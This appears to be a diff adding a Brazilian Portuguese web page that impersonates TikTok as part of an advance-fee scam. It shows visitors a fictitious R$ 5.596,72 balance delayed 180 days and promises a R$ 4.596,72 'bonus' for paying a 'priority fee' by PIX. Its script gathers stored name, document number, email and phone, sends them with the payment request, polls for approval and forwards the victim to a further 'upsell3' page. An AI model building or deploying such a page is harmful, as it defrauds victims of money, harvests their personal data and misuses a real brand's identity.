@@ -1,0 +1,482 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>TikTok - Antecipação Prioritária</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800;900&display=swap');
+
+    body {
+      font-family: 'Inter', sans-serif;
+      letter-spacing: -0.02em;
+      background-color: #ffffff;
+    }
+
+    /* Relógio Estilo TikTok */
+    .clock-base {
+      width: 80px;
+      height: 80px;
+      border: 6px solid #161823;
+      border-radius: 50%;
+      position: relative;
+      background: white;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
+    }
+
+    .clock-center {
+      width: 8px;
+      height: 8px;
+      background: #FE2C55;
+      border-radius: 50%;
+      z-index: 10;
+    }
+
+    .hand {
+      position: absolute;
+      background: #161823;
+      border-radius: 10px;
+      transform-origin: bottom center;
+      bottom: 50%;
+      left: calc(50% - 2px);
+    }
+
+    .hour-hand {
+      width: 4px;
+      height: 20px;
+      animation: rotate-clock 12s linear infinite;
+    }
+
+    .minute-hand {
+      width: 3px;
+      height: 28px;
+      animation: rotate-clock 2s linear infinite;
+      background: #FE2C55;
+    }
+
+    @keyframes rotate-clock {
+      from {
+        transform: rotate(0deg);
+      }
+
+      to {
+        transform: rotate(360deg);
+      }
+    }
+
+    .btn-tiktok {
+      background-color: #FE2C55;
+      transition: all 0.2s ease;
+    }
+
+    .btn-tiktok:active {
+      transform: scale(0.96);
+    }
+
+    .premium-card {
+      background: linear-gradient(135deg, #161823 0%, #292d3e 100%);
+    }
+
+    details summary::-webkit-details-marker {
+      display: none;
+    }
+  </style>
+</head>
+
+<body class="text-[#161823]">
+
+  <div
+    class="bg-black text-white text-center py-3 px-4 text-[11px] font-bold uppercase tracking-tight leading-tight w-full sticky top-0 z-50">
+    O valor será creditado no prazo de até 180 dias. Recomendamos a antecipação para evitar a possibilidade de perda da
+    vaga!
+  </div>
+
+  <div id="upsellScreen">
+    <div class="max-w-md mx-auto min-h-screen relative bg-white pb-10">
+
+      <div class="flex flex-col items-center px-5 py-8 border-b border-gray-50">
+        <img src="https://images.seeklogo.com/logo-png/37/2/tiktok-app-logo-png_seeklogo-375617.png" alt="TikTok"
+          class="h-20 w-20 object-contain mb-4">
+        <div class="text-center">
+          <span class="text-[10px] font-bold text-gray-400 uppercase tracking-widest">Saldo em Processamento</span>
+          <span class="block text-4xl font-black text-[#161823] leading-none tracking-tighter">R$ 5.596,72</span>
+        </div>
+      </div>
+
+      <div class="px-5 py-8">
+        <div class="text-center mb-8">
+          <h1 class="text-2xl font-black text-slate-800 mb-2 italic text-center">SAQUE SOLICITADO!</h1>
+          <p class="text-sm text-gray-500 font-medium mb-6">Prazo de processamento bancário: 180 dias.</p>
+
+          <div class="flex justify-center items-center mb-6">
+            <div class="clock-base">
+              <div class="clock-center"></div>
+              <div class="hand hour-hand"></div>
+              <div class="hand minute-hand"></div>
+            </div>
+          </div>
+
+          <p class="text-[12px] font-black text-[#FE2C55] uppercase tracking-widest animate-pulse">Vaga de Antecipação
+            Prioritária Disponível</p>
+        </div>
+
+        <div class="space-y-6">
+          <div class="bg-gray-50 border-l-4 border-[#25F4EE] p-5 rounded-r-lg shadow-sm">
+            <p class="text-[15px] text-gray-800 leading-relaxed text-center">
+              ⚡ <strong>BÔNUS EXCLUSIVO:</strong> Antecipe seu saque agora e receba um adicional de <strong
+                class="text-[#FE2C55]">R$ 4.596,72</strong> direto no seu PIX hoje!
+            </p>
+          </div>
+
+          <a onclick="initiateCheckout(event)"
+            class="btn-tiktok block w-full text-white text-center py-5 rounded-2xl shadow-xl transition-all active:scale-95">
+            <span class="block font-[900] text-xl uppercase leading-none">ANTECIPAR E RECEBER TUDO</span>
+            <span class="block font-medium text-sm opacity-90 mt-1 uppercase tracking-tighter">Receber R$ 10.192,72
+              Agora</span>
+          </a>
+
+          <div class="border-2 border-[#161823] rounded-3xl p-6 bg-white shadow-sm mt-8">
+            <div class="space-y-3 mb-6 px-1">
+              <div class="flex justify-between text-[13px]">
+                <span class="text-gray-500">Saque padrão:</span>
+                <span class="font-bold">R$ 5.596,72</span>
+              </div>
+              <div class="flex justify-between text-[13px]">
+                <span class="text-green-600 font-bold">Bônus de Antecipação:</span>
+                <span class="text-green-600 font-bold">+ R$ 4.596,72</span>
+              </div>
+              <div class="flex justify-between text-[13px] pt-2 border-t border-gray-100">
+                <span class="text-gray-500 italic">Taxa de Prioridade:</span>
+                <span class="font-bold text-[#FE2C55]" id="price">R$ 00,00</span>
+              </div>
+            </div>
+
+            <div class="border border-gray-100 rounded-2xl p-5 flex flex-col items-center bg-gray-50">
+              <span class="text-[11px] uppercase font-black text-gray-400 mb-1 text-center">Total a receber no PIX
+                hoje:</span>
+              <span class="text-4xl font-[900] text-[#161823] tracking-tighter text-center">R$ 10.192,72</span>
+              <div
+                class="mt-2 text-[10px] text-[#25F4EE] font-black tracking-widest uppercase text-center leading-tight bg-black px-3 py-1 rounded-full">
+                Envio Imediato Liberado</div>
+            </div>
+          </div>
+
+          <div class="premium-card rounded-3xl p-6 shadow-lg">
+            <div class="flex items-center justify-between mb-2">
+              <span class="text-[10px] font-black text-white/60 uppercase tracking-widest">Verificado pelo TikTok
+                Ads</span>
+              <div class="bg-white/10 px-2 py-1 rounded-md text-[9px] font-bold text-white uppercase">v9.2 Beta</div>
+            </div>
+            <div class="flex flex-col items-center py-2">
+              <span class="text-4xl font-black text-white tracking-tighter">TikTok Bônus</span>
+              <p class="text-[11px] font-bold text-white/70 mt-1 uppercase text-center leading-tight">Valor total
+                disponível para envio prioritário</p>
+            </div>
+            <div class="w-full bg-white/10 h-[1px] my-3"></div>
+            <p class="text-[9px] text-center text-white/50 font-medium italic">A liberação ocorre em até 5 minutos após
+              a confirmação da taxa de prioridade.</p>
+          </div>
+        </div>
+
+        <div class="mt-10 space-y-3 text-center">
+          <p class="text-[11px] text-gray-400 font-bold uppercase tracking-widest">Dúvidas Frequentes</p>
+          <details class="group bg-gray-50 rounded-xl border border-gray-100 text-left">
+            <summary class="flex justify-between items-center p-4 cursor-pointer font-bold text-sm">
+              Por que antecipar meu saque?
+              <span class="text-[#FE2C55] group-open:rotate-45 transition-transform text-xl">+</span>
+            </summary>
+            <div class="px-4 pb-4 text-sm text-gray-500 leading-relaxed">
+              Ao antecipar, você sai da fila de espera bancária de 180 dias e recebe o bônus de R$ 4.596,72 que é
+              limitado aos primeiros participantes da campanha.
+            </div>
+          </details>
+        </div>
+      </div>
+
+      <footer class="py-10 text-center text-[10px] text-gray-300 font-bold uppercase tracking-[0.3em]">
+        TikTok Financial © 2026
+      </footer>
+    </div>
+  </div>
+  <!-- QR Code / PIX Section (copiado do upsell1) -->
+  <div id="qrcodeSection" class="hidden" style="padding: 0 16px;">
+    <div class="px-6 pt-10 pb-8 flex flex-col items-center border-b border-gray-50 bg-white">
+      <img src="https://i.postimg.cc/XYwkPWhz/imagem-2026-01-02-213823889.png" alt="TikTok Logo"
+        class="h-28 w-28 object-contain mb-6 logo-sharp drop-shadow-sm" />
+      <div class="text-center">
+        <p class="text-[11px] font-bold text-gray-400 uppercase tracking-[0.2em] mb-1">
+          Valor do Pagamento
+        </p>
+        <h2 class="text-5xl font-[900] text-[#161823] tracking-tighter" id="paymentValue">
+          R$ 0,00
+        </h2>
+      </div>
+    </div>
+    <div class="text-center mb-6">
+      <h3 class="text-2xl font-black mb-2 text-gray-900">
+        Escaneie o QR Code
+      </h3>
+      <p class="text-gray-500 text-sm">Ou copie o código PIX abaixo</p>
+    </div>
+    <div
+      class="bg-gradient-to-br from-gray-50 to-white border-2 border-gray-200 rounded-2xl p-6 mb-6 flex justify-center shadow-inner">
+      <img id="qrCodeImage" src="#" alt="QR Code PIX" class="max-w-full rounded-lg" />
+    </div>
+    <div class="mb-6">
+      <label class="block text-sm font-bold text-gray-700 mb-3">Código PIX (Copiar e Colar)</label>
+      <div class="flex gap-2">
+        <input type="text" id="pixCode" readonly
+          class="flex-1 p-4 rounded-xl border-2 border-gray-200 bg-gray-50 text-xs font-mono" />
+        <button
+          class="btn-tiktok px-6 py-4 rounded-xl text-white font-bold uppercase text-xs shadow-lg hover:opacity-90 transition-all"
+          id="copy-pix-button">
+          COPIAR
+        </button>
+      </div>
+    </div>
+
+    <!-- Instruções de Pagamento PIX -->
+    <div class="bg-gradient-to-r from-emerald-50 to-teal-50 rounded-2xl p-5 mb-6 border border-emerald-200">
+      <h4 class="text-base font-black text-emerald-800 mb-4 flex items-center gap-2">
+        <span class="text-xl">📱</span> Como pagar com PIX
+      </h4>
+      <div class="space-y-3">
+        <div class="flex items-start gap-3">
+          <div class="w-7 h-7 bg-emerald-500 rounded-full flex items-center justify-center flex-shrink-0">
+            <span class="text-white text-xs font-bold">1</span>
+          </div>
+          <p class="text-sm text-gray-700">
+            Abra o <strong>app do seu banco</strong> no celular
+          </p>
+        </div>
+        <div class="flex items-start gap-3">
+          <div class="w-7 h-7 bg-emerald-500 rounded-full flex items-center justify-center flex-shrink-0">
+            <span class="text-white text-xs font-bold">2</span>
+          </div>
+          <p class="text-sm text-gray-700">
+            Escolha pagar com <strong>PIX</strong> e selecione
+            <strong>"Copia e Cola"</strong> ou <strong>"QR Code"</strong>
+          </p>
+        </div>
+        <div class="flex items-start gap-3">
+          <div class="w-7 h-7 bg-emerald-500 rounded-full flex items-center justify-center flex-shrink-0">
+            <span class="text-white text-xs font-bold">3</span>
+          </div>
+          <p class="text-sm text-gray-700">
+            <strong>Cole o código</strong> copiado ou
+            <strong>escaneie o QR Code</strong> acima
+          </p>
+        </div>
+        <div class="flex items-start gap-3">
+          <div class="w-7 h-7 bg-emerald-500 rounded-full flex items-center justify-center flex-shrink-0">
+            <span class="text-white text-xs font-bold">4</span>
+          </div>
+          <p class="text-sm text-gray-700">
+            Confirme o pagamento e <strong>aguarde a confirmação</strong>
+          </p>
+        </div>
+      </div>
+    </div>
+
+    <div class="bg-blue-50 border-l-4 border-blue-500 p-4 rounded-r-lg mb-4">
+      <p class="text-sm text-gray-700">
+        <strong class="text-blue-700">Aguardando pagamento...</strong><br />
+        <span class="text-gray-600">O status será atualizado automaticamente.</span>
+      </p>
+    </div>
+    <div id="paymentStatus" class="text-center text-sm font-bold text-gray-600 mb-4">
+      Status: Aguardando pagamento
+    </div>
+  </div>
+
+  <!-- Sucesso -->
+  <div id="successSection" class="hidden px-6 py-8">
+    <div class="text-center">
+      <div class="w-20 h-20 bg-green-500 rounded-full flex items-center justify-center mx-auto mb-6">
+        <svg class="w-10 h-10 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+          <path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M5 13l4 4L19 7"></path>
+        </svg>
+      </div>
+      <h3 class="text-2xl font-black mb-2 text-green-600">
+        Pagamento Confirmado!
+      </h3>
+      <p class="text-gray-600 mb-6">Seu saque será liberado em breve.</p>
+    </div>
+  </div>
+
+  <script>
+    const pixQrCodeScreen = document.getElementById("qrcodeSection");
+    const pixSuccessScreen = document.getElementById("successSection");
+    const qrCodeImage = document.getElementById("qrCodeImage");
+    const pixCode = document.getElementById("pixCode");
+    const paymentField = document.getElementById("paymentValue");
+    const upsellScreen = document.getElementById("upsellScreen");
+
+    const pathParts = window.location.pathname.split('/').filter(Boolean);
+    const baseFolder = pathParts[0];
+
+    let currentUpsellVal = 2684;
+
+    const price = document.getElementById("price");
+    async function fetchUpsellValue() {
+      try {
+        const urlParams = new URLSearchParams(window.location.search);
+        const uId = urlParams.get("upsell") || "up2";
+        const req = await fetch(`/${baseFolder}/get-upsell-value.php?upsell=${uId}`);
+        const res = await req.json();
+        if (res.success) {
+          currentUpsellVal = Math.round(res.value * 100);
+          price.textContent = formatPrice(currentUpsellVal / 100);
+        }
+      } catch (e) {
+        console.error("Erro ao buscar valor do upsell", e);
+      }
+    }
+
+    fetchUpsellValue();
+
+    function formatPrice(value) {
+      return `R$ ${parseFloat(value)
+        .toFixed(2)
+        .replace(".", ",")}`;
+    }
+
+    let pollingInterval;
+    let pollingAttempts = 0;
+    const MAX_POLLING_ATTEMPTS = 60;
+
+    async function initiateCheckout(event) {
+      event.preventDefault();
+
+      const clientRawData = localStorage.getItem("clientData");
+      const clientData = clientRawData ? JSON.parse(clientRawData) : null;
+
+      try {
+        const name = clientData?.nome
+          ? clientData.nome.trim()
+          : "Cliente Upsell";
+        const document = clientData?.document || "";
+        const email = clientData?.email || "";
+        const phone = clientData?.phone || "";
+
+        const formData = new FormData();
+        formData.append("priceInCents", currentUpsellVal);
+        formData.append("email", email);
+        formData.append("name", name);
+        formData.append("document", document);
+        formData.append("phone", phone);
+
+        const urlParams = new URLSearchParams(window.location.search);
+
+        const utmData = {
+          utm_source:
+            urlParams.get("utm_source") ||
+            localStorage.getItem("utm_source") ||
+            "",
+          utm_medium:
+            urlParams.get("utm_medium") ||
+            localStorage.getItem("utm_medium") ||
+            "",
+          utm_campaign:
+            urlParams.get("utm_campaign") ||
+            localStorage.getItem("utm_campaign") ||
+            "",
+          utm_content:
+            urlParams.get("utm_content") ||
+            localStorage.getItem("utm_content") ||
+            "",
+          utm_term:
+            urlParams.get("utm_term") ||
+            localStorage.getItem("utm_term") ||
+            "",
+          xcod: urlParams.get("xcod") || localStorage.getItem("xcod") || "",
+          sck: urlParams.get("sck") || localStorage.getItem("sck") || "",
+        };
+
+        Object.entries(utmData).forEach(([key, value]) => {
+          formData.append(key, value);
+        });
+
+        const response = await fetch(`/${baseFolder}/pagamento.php`, {
+          method: "POST",
+          body: formData,
+        });
+        const responseData = await response.json();
+
+        if (responseData.success) {
+          if (upsellScreen) {
+            upsellScreen.style.display = "none";
+          }
+          pixQrCodeScreen.classList.remove("hidden");
+          qrCodeImage.src = responseData.qrCodeUrl;
+          pixCode.value = responseData.pixCode;
+          paymentField.textContent = formatPrice(currentUpsellVal / 100);
+          startPaymentPolling(responseData.token);
+        } else {
+          console.error("Resposta inesperada do pagamento:", responseData);
+        }
+      } catch (error) {
+        console.error("Erro ao gerar PIX:", error);
+      }
+    }
+
+    async function startPaymentPolling(transactionToken) {
+      if (pollingInterval) clearInterval(pollingInterval);
+      pollingAttempts = 0;
+
+      pollingInterval = setInterval(async () => {
+        pollingAttempts++;
+        if (pollingAttempts > MAX_POLLING_ATTEMPTS) {
+          clearInterval(pollingInterval);
+          return;
+        }
+
+        try {
+          const response = await fetch(`/${baseFolder}/verificar.php?id=${transactionToken}`);
+          if (!response.ok) return;
+
+          const result = await response.json();
+
+          if (result.data.mangofy_data.data.payment_status === 'approved') {
+            clearInterval(pollingInterval);
+            pixQrCodeScreen.classList.add("hidden");
+            pixSuccessScreen.classList.remove("hidden");
+
+            setTimeout(() => {
+              window.location.href = `upsell3.html${window.location.search}`;
+            }, 2000);
+          }
+        } catch (error) {
+          console.error("Polling error", error);
+        }
+      }, 5000);
+    }
+
+    const copyPixButton = document.getElementById("copy-pix-button");
+    const pixCodeText = document.getElementById("pixCode");
+
+    copyPixButton.addEventListener("click", function () {
+      if (pixCodeText.value) {
+        navigator.clipboard
+          .writeText(pixCodeText.value.trim())
+          .then(() => {
+            copyPixButton.textContent = "Código PIX copiado!";
+            setTimeout(() => {
+              copyPixButton.textContent = "COPIAR";
+            }, 3000);
+          })
+          .catch(() => {
+            copyPixButton.textContent = "Erro ao copiar.";
+          });
+      }
+    });
+  </script>
+
+</body>
+
+</html>
